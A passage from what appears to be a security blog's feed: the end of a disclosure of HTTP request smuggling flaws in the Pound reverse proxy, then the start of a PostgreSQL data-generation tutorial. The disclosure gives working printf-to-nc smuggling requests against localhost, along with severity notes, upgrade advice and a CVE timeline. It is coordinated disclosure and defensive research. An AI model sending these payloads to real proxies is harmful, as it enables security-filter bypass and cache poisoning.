&lt;span class=&quot;s1&quot;&gt;&amp;#39; zorg\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length: 57\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;5) Transmission issues&lt;/h3&gt;

&lt;p&gt;This strange ops-fold syntax transmitted could be a problem. This was removed in version 2.8.
Usually the Reverse proxy which support ops-fold are not transmitting the syntax (everything back on one line).&lt;/p&gt;

&lt;p&gt;They were other transmission issues like this one (sadly not fixed):&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;0000000000000000000000000000042\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is not an invalid query. The first chunk size is &lt;code&gt;42&lt;/code&gt; in hexa, so 66 bytes.
The second chunk is the end-of-chunks marker, the last 2 lines &lt;code&gt;0\r\n\r\n&lt;/code&gt;.
The &lt;code&gt;GET /tmp/&lt;/code&gt; query does not exists, it's just some uninterpreted bytes in the first chunk body of 66 bytes.&lt;/p&gt;

&lt;p&gt;But if you use wireshark you will detect that this message is transfered as-is,
the &lt;code&gt;0000000000000000000000000000042&lt;/code&gt; is not rewitten as &lt;code&gt;42&lt;/code&gt; or &lt;code&gt;042&lt;/code&gt;.
That's still officially not an issue. The problem is that this syntax is sometimes
an issue for some backends (chunk size attribute truncation issues) where
you may read this &lt;code&gt;0000000000000000000000000000042&lt;/code&gt; as &lt;code&gt;00000000000000000&lt;/code&gt; and wrongly detect it
as an end-of-chunks marker. And then discover the (false) &lt;code&gt;GET /tmp/&lt;/code&gt; query.&lt;/p&gt;

&lt;p&gt;Of course the security issue here is on the backend, not Pound. But &lt;strike&gt;shi&lt;/strike&gt;things happens.&lt;/p&gt;

&lt;p&gt;Some other transmissions issues were fixed, like these strange syntax:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /url?foo=[SOMETHING]HTTP/0.9 HTTP/1.1\r\n
or
GET /url?foo=[SOMETHING]Host:example.com, HTTP/1.1\r\n
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;with [SOMETHING] = BACKSPACE or CR or BEL or FORMFEED or HTAB or VTAB.&lt;/p&gt;

&lt;h2&gt;Severity&lt;/h2&gt;

&lt;p&gt;Bad HTTP syntax parsing is a security issue, the main problem is that any bad
HTTP actor in a network of HTTP actors becomes the hammer and previous actors
becomes nails.&lt;/p&gt;

&lt;p&gt;The actor which suffers from Request splitting is the one which wrongly read a garbage body and extract a query from it.
No other preceding actor could filter this query before because it was just a body (security filter bypass).
And No one is expecting this query response (cache poisoning, etc.).&lt;/p&gt;

&lt;p&gt;That's why the RFC has some minimal requirements on syntax parsing around message size.&lt;/p&gt;

&lt;p&gt;On most installations Pound will be the SSL terminator, usually the &lt;strong&gt;first server side actor&lt;/strong&gt; in the chain.&lt;/p&gt;

&lt;p&gt;In this position the request splitting attacks are hard to exploit, maybe it could be used to poison a Forward proxy on client side, maybe.
But it cannot be used to attack the backends.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;_____________________________              _________________________________
|      Client Side          |              |     Server Side               |
Browser ---&amp;gt; Forward proxy ------Internet---&amp;gt; Pound ---&amp;gt; Varnish ---&amp;gt; Nginx
                    NAIL? &amp;lt;================== HAMMER?
                                              NAIL? &amp;lt;==== HAMMER?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Maybe some other HTTPS load balancers are present in front of Pound, on some big installations,
that would be more dangerous as Pound could be used to send some extra responses to these proxys (WAFs?).&lt;/p&gt;

&lt;p&gt;But on this position the most effective issues, on an attacker point of view,
are transmission issues, where bad crafted headers are transmitted to backends by Pound. Because &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2016-2086&quot;&gt;on&lt;/a&gt; &lt;a href=&quot;http://dev.eclipse.org/mhonarc/lists/jetty-announce/msg00123.html&quot;&gt;the&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2016-6816&quot;&gt;backends&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2016-8743&quot;&gt;you&lt;/a&gt; &lt;a href=&quot;https://trac.nginx.org/nginx/ticket/762&quot;&gt;could&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-8852&quot;&gt;have&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-3183&quot;&gt;some&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-5739&quot;&gt;issues&lt;/a&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-5740&quot;&gt;and&lt;/a&gt; it's always a bad idea to send bad queries to backends.&lt;/p&gt;

&lt;p&gt;If you look at the two main errors, Double Content Length and no respect of chunked priority, it is more dangerous on a backend than on a front.
This, in my mind, reduces the impact of exploitations of these issues. I may be wrong. But transmissions issues,
which are more dangerous for the ecosystem, are usually not even considered as security issues,
because the Proxy is not doing any splitting, just forwarding some dangerous syntax.&lt;/p&gt;

&lt;h2&gt;I use Pound, what can I do?&lt;/h2&gt;

&lt;p&gt;First of all you can use Pound 2.8. Or a 2.7.x with the patchs.&lt;/p&gt;

&lt;p&gt;If the fixed package is not available on your distribution you can &lt;strong&gt;easily&lt;/strong&gt; compile Pound 2.8. I made several compilations of Pound on jessie and stretch docker environements without any complexity (configure/make/make install).&lt;/p&gt;

&lt;p&gt;Then you can also follow the Debian team and check for more active alternatives. &lt;a href=&quot;http://www.haproxy.org/&quot;&gt;Haproxy&lt;/a&gt; for example.&lt;/p&gt;

&lt;h2&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2016-09-05: reports to project maintainers&lt;/li&gt;
&lt;li&gt;2016-09-08: some more reports&lt;/li&gt;
&lt;li&gt;2016-10-23: version 2.8a (experimental) &lt;a href=&quot;http://www.apsis.ch/pound/pound_list/archive/2016/2016-10/1477235279000&quot;&gt;published&lt;/a&gt;, with all the fixs, &lt;em&gt;request smuggling&lt;/em&gt; is used in the announce, not the word &lt;em&gt;security&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;2018-01-15: asking project maintainer for CVE. Yes, quite late, I'm not always working on this subject :-)&lt;/li&gt;
&lt;li&gt;2018-01-29: CVE Id reserved by me and transfered to the vendor&lt;/li&gt;
&lt;li&gt;2018-02-13: pound fixed On &lt;a href=&quot;https://lists.debian.org/debian-lts-announce/2018/02/msg00015.html&quot;&gt;debian7 Wheezy (old)&lt;/a&gt;, patch proposed &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=888786&quot;&gt;for jessie and stretch&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;2018-02-24: pound removed from Debian unstable&lt;/li&gt;
&lt;li&gt;2018-05-11: Pound &lt;a href=&quot;http://www.apsis.ch/pound/pound_list/archive/2018/2018-05/1526034164000#1526034164000&quot;&gt;2.8 released&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2018-07-03: this page&lt;/li&gt;
&lt;/ul&gt;


&lt;h2&gt;See also&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=dVU9i5PsMPY&quot;&gt;Defcon HTTP Smuggling&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf&quot;&gt;Defcon support&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=lY_Mf2Fv7kI&quot;&gt;Defcon demos&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2018-07-03 00:00:00 +0200</published>
				<link>http://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/</link>
			</item>
		
			<item>
				<title>PostgreSQL, advanced use of generate_series for data generation</title>
				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://www.makina-corpus.com/blog/metier/2017/postgresql-utilisations-avancees-de-generate_series-pour-generer-du-contenu&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
&lt;small&gt;estimated read time: 10-15min&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Generating massive amounts of data can be useful to test queries, indexes and
complex treatments on more realistics volumes, to get useful approximations of
production response times.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;In this article we'll study some &lt;code&gt;generate_series()&lt;/code&gt; usages allowing us to feed all types of tables.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The starting point is that we have two tables to feed (&lt;code&gt;contact&lt;/code&gt; and &lt;code&gt;company&lt;/code&gt;), with some constraints on these tables:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;a &lt;strong&gt;foreign key&lt;/strong&gt; contraint, linking a &lt;code&gt;contact&lt;/code&gt; to one &lt;code&gt;company&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;some constraints on column &lt;strong&gt;sizes&lt;/strong&gt; (like for last name and first name)&lt;/li&gt;
&lt;li&gt;some specific constraints (CHECK) on &lt;strong&gt;dates&lt;/strong&gt; (like a &lt;code&gt;contact&lt;/code&gt; has some first and last interactions dates,
and these dates have some constraints between each other, and cannot be in the future, etc.)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;The other point is that we need to work on several tens of thousands of rows.
For example to apply a functionnal process that need to be applied in production later and control the speed
of this process. Or simply to test that our indexation plan is right.&lt;/p&gt;

&lt;p&gt;Some tools exists, able to generate content. In the Django world, for example,
you could use &lt;a href=&quot;https://factoryboy.readthedocs.io/en/latest/&quot;&gt;Factory Boy&lt;/a&gt;, or &lt;a href=&quot;https://djangopackages.org/grids/g/fixtures/&quot;&gt;others&lt;/a&gt;. But here we'll show how to generate this same type of data in a quite &lt;em&gt;simple&lt;/em&gt; manne,
&lt;strong&gt;using SQL&lt;/strong&gt; directly, in a very very fast way (fast enough to be added in a
functionnal test setUp).&lt;/p&gt;

&lt;p&gt;We first need a realistic model. With a &lt;code&gt;company&lt;/code&gt; table, a &lt;code&gt;contact&lt;/code&gt; table, some
index, and two or three lines of examples.&lt;/p&gt;

&lt;p&gt;You can download &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/basic_schema.sql&quot;&gt;an example basic_schema.sql script&lt;/a&gt; containing all these elements (&lt;a href=&quot;http://regilero.github.io/theme/resource/pgserie/basic_schema.sql&quot;&gt;direct download&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;And we can also use &lt;strong&gt;SQLFiddle&lt;/strong&gt; to &lt;a href=&quot;http://sqlfiddle.com/#!17/25d75/1&quot;&gt;visualize this structure online&lt;/a&gt;. But my
advice is to create a test database and to run this SQL inside, it will be easier
to test the complex queries in your own database.&lt;/p&gt;

&lt;h2&gt;Simple data generation&lt;/h2&gt;

&lt;p&gt;Let's use &lt;code&gt;generate_series&lt;/code&gt; to generate some data :&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;c1&quot;&gt;-- tall numbers between 1 and 100 (step 1 by default)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- all dates between 2010/05/10 and now,&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- with a step of 78 days, 15 hours and 10 minutes&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;2010-10-05 00:00&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                              &lt;span class=&quot;k&quot;&gt;CURRENT_TIMESTAMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                              &lt;span class=&quot;s1&quot;&gt;&amp;#39;8 days 15 hours 12min&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As we can see this function is quite powerful (&lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/191&quot;&gt;SQLFidlle1&lt;/a&gt; &lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/190&quot;&gt;SQLFidlle2&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;But our goal is to push this usage &lt;strong&gt;further&lt;/strong&gt;.&lt;/p&gt;

&lt;h2&gt;Generating names from syllables&lt;/h2&gt;

&lt;p&gt;Let's start with &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/feeding_company.sql&quot;&gt;this query&lt;/a&gt; which generates a lot of company names, we'll use that to feed the &lt;code&gt;company&lt;/code&gt; table:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;concat_ws&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name_last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;generated&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_agg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;{CO,GE,FOR,SO,CO,GIM,SE,CO,GE,CA,FRA,GEC,GE,GA,FRO,GIP}&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_arr&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syllarr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;-- need 3 syllabes, and force generator interpretation with the &amp;#39;*0&amp;#39; (else 3 same syllabes)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp3syl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp_name_1st&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;{Ltd,&amp;amp; Co,SARL,SA,Gmbh,United,Brothers,&amp;amp; Sons,International,Ext,Worldwide,Global,2000,3000}&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp_name_last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As we &lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/186&quot;&gt;can see on SQL Fiddle&lt;/a&gt; this somewhat strange query works and generates 10,000 company names, from 3 syllables and a final word (like &quot;SOCOGEC 2000&quot; or &quot;COGEFOR Worldwide&quot;). &lt;strong&gt;The query does not use any table, there's not even a model for this in SQL Fiddle.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this query we can find some calls to &lt;code&gt;RANDOM()&lt;/code&gt; allowing choices variations on syllables, the  &lt;code&gt;% 14&lt;/code&gt; and &lt;code&gt;% 16&lt;/code&gt; are importants, they use the array effective size to choose randomly one the record in the array.
The &lt;strong&gt;most complex part&lt;/strong&gt; of the request is the &lt;code&gt;+ (generator*0)&lt;/code&gt;, reusing the identifier generated in &lt;code&gt;generate_series&lt;/code&gt;,
multiplied by 0 (so doing nothing with it). Without this call the subquery would be optimized
and not a correlated one, and only on syllables combination would be generated. We would have 10,000 rows, with 10,000 identifiers, but the same company name for each line.&lt;/p&gt;

&lt;p&gt;Once we have a good &lt;code&gt;SELECT&lt;/code&gt; we just have to &lt;code&gt;INSERT&lt;/code&gt; the result in the table, using an insert query of this form:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.....&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- (here the select we just found) ....&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFLICT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOTHING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


